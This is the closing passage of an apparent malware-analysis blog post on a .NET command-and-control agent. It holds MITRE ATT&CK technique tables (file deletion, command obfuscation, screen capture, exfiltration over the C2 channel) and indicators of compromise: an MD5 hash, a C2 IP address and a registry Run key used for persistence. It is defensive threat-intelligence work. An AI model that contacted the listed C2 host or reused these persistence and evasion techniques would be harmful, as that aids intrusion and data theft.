<tr>
<td>T1070.004</td>
<td>Defence evasion</td>
<td>Indicator Removal: File Deletion</td>
<td>The agent has the capability to delete files</td>
</tr>
<tr>
<td>T1027.010</td>
<td>Defence evasion</td>
<td>Obfuscated Files or Information: Command Obfuscation</td>
<td>Character substitution was used to obfuscate commands</td>
</tr>
<tr>
<td>T1057</td>
<td>Discovery</td>
<td>Process Discovery</td>
<td>The agent has the capability to list processes</td>
</tr>
<tr>
<td>T1082</td>
<td>Discovery</td>
<td>System Information Discovery</td>
<td>The agent has the capability to obtain information about the system</td>
</tr>
<tr>
<td>T1113</td>
<td>Collection</td>
<td>Screen Capture</td>
<td>The agent has the capability to take screenshots</td>
</tr>
<tr>
<td>T1005</td>
<td>Collection</td>
<td>Data from Local System</td>
<td>The agent has the capability to obtain information about the system&rsquo;s files</td>
</tr>
<tr>
<td>T1571</td>
<td>Command and Control</td>
<td>Non-Standard Port</td>
<td>The agent communicates using a non-standard port</td>
</tr>
<tr>
<td>T1095</td>
<td>Command and Control</td>
<td>Non-Application Layer Protocol</td>
<td>The agent communicates directly through a TCP connection</td>
</tr>
<tr>
<td>T1041</td>
<td>Command and Control</td>
<td>Exfiltration Over C2 Channel</td>
<td>The agent exfiltrates information using the connection with the C2 server</td>
</tr>
</tbody>
</table>
<h2 id="5-ioc">
  5. IOC
  <a href="#5-ioc" class="h-anchor" aria-hidden="true">#</a>
</h2>
<table>
<thead>
<tr>
<th>IOC</th>
<th>Tipo</th>
<th>Descripción</th>
</tr>
</thead>
<tbody>
<tr>
<td>59211a4e0f27d70c659 636746b61945a</td>
<td>Hash MD5</td>
<td>C2 agent hash</td>
</tr>
<tr>
<td>162.245.191.217</td>
<td>IP</td>
<td>IP that the agent calls</td>
</tr>
<tr>
<td>HKEY\CURRENT \USER\Software \Microsoft\Windows \CurrentVersion \Run\haijwivetsgVr</td>
<td>Llave de registro</td>
<td>Registry key used to establish persistence</td>
</tr>
</tbody>
</table>

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h"
              >Read other posts</span
            >
            <hr />
          </div>
          <div class="pagination__buttons">
            
            
              <span class="button next">
                <a href="/en/posts/003-analyzing-a-dotnet-c2-agent-part1-macro-dropper/">
                  <span class="button__text">003 - Analyzing a C2 agent - Part 1: The Dropper</span>
                  <span class="button__icon">→</span>
                </a>
              </span>
            
          </div>
        </div>
      
    

    
      
        

      
    
  </article>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <a
  href="/"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
      >Threat Anatomy Blog</span
    >
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span>© 2023 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
        <span><a href="https://github.com/panr/hugo-theme-hello-friend" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
      </div>
    
  </div>
</footer>





<script type="text/javascript" src="/bundle.min.js"></script>


      
    </div>

    
  </body>
</html>
